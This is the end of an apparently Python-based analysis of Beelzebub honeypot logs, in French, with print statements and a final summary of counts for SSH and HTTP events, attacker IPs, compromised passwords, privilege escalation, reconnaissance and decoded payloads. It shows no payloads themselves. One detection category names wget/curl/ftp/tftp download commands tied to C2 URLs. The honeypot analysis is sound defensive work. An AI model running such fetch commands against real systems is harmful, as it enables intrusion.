print(f"   - Modif. système: {system_modification.height}")
print(f"   - Reconnaissance: {recon_commands.height}")
print(f"\n🌐 Anomalies réseau:")
print(f"   - DNS spoofing/fronting: {len(dns_anomalies)}")
print(f"   - Payloads HTTP suspects: {len(http_payloads)}")
print(f"\n🔓 Base64 décodés:")
print(f"   - Payloads décodés: {len(decoded)}")
print("\n" + "=" * 60)



  RÉSUMÉ FINAL — ANALYSE BEELZEBUB HONEYPOT

📊 Nombre total d'événements:
   - SSH: 24264 events
   - HTTP: 14936 events

🎯 Attaquants identifiés:
   - IPs totales (SSH): 659
   - IPs HTTP-only: 229
   - IP avec score d'intensité: 483

🔐 Mots de passe compromis:
   - Total analysés: 30
   - Le plus utilisé:  (11154 occurrences)

📡 Commandes de téléchargement:
   - wget/curl/ftp/tftp: 140
   - URLs C2 distinctes: 20

🔧 Persistence & Escalade:
   - Cron: 56
   - Modif. utilisateurs: 104
   - Privilege escalation: 696
   - Modif. système: 530
   - Reconnaissance: 3654

🌐 Anomalies réseau:
   - DNS spoofing/fronting: 0
   - Payloads HTTP suspects: 34

🔓 Base64 décodés:
   - Payloads décodés: 72

